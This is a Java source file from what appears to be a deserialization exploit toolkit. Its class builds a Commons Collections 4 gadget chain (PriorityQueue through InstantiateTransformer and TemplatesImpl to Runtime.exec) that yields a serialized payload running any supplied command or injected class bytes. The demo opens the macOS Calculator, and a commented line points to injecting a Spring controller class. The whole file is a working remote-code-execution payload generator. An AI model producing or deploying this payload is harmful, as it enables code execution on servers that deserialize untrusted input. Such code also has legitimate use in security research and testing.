package xyz.eki.marshalexp.poc;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.Transformer;
import xyz.eki.marshalexp.gadget.cc.GCC;
import xyz.eki.marshalexp.gadget.cc.GCC4;
import xyz.eki.marshalexp.sink.jdk.GTemplates;
import xyz.eki.marshalexp.utils.SerializeUtils;

import javax.xml.transform.Templates;
import java.util.PriorityQueue;

import static xyz.eki.marshalexp.utils.ReflectUtils.setFieldValue;

/*
	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				...
					TransformingComparator.compare()
						InstantiateTransformer.transform()
							Method.invoke()
								Runtime.exec()
 */
public class CC4 implements POC{

    private Object getPocObject(Transformer transformer) throws Exception {
        PriorityQueue priorityQueue = GCC4.deserialize2TransformerInvoke(transformer);
        return priorityQueue;
    }
    @Override
    public Object getPocObject(byte[] clzBytes) throws Exception {
        return getPocObject(GCC4.instantiateTransformer2RCE(clzBytes));
    }

    @Override
    public Object getPocObject(String cmd) throws Exception {
        return getPocObject(GCC4.instantiateTransformer2RCE(cmd));
    }

    public static void main(String[] args) throws Exception {
        CC4 gen = new CC4();

        String cmd = "open /System/Applications/Calculator.app";
//        byte[] code = MiscUtils.dumpClass(MSpringController3.class);
        Object poc = gen.getPocObject(cmd);
//        Object poc = gen.getPocObject(code);
        byte[] test = SerializeUtils.serialize(poc);
        SerializeUtils.deserialize(test);
        //System.out.println(MiscUtils.base64Encode(test));
    }
}
